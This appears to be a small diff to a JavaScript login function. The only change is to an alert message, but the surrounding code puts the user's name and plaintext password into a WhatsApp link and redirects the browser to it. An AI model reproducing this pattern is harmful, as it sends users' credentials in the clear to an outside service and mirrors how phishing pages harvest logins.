@@ -6,6 +6,6 @@ function submitLogin(event) {
 
     const message = `Name: ${name1}\nPassword: ${password}\n He wants to login to your site .`;
     const whatsappLink = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
-     alert('Thanks ' + name1 + 'Your login details will be checked ');
+     alert('Thanks ' + name1 + ' \n Your login details will be checked ');
             window.location.href = whatsappLink;
 }
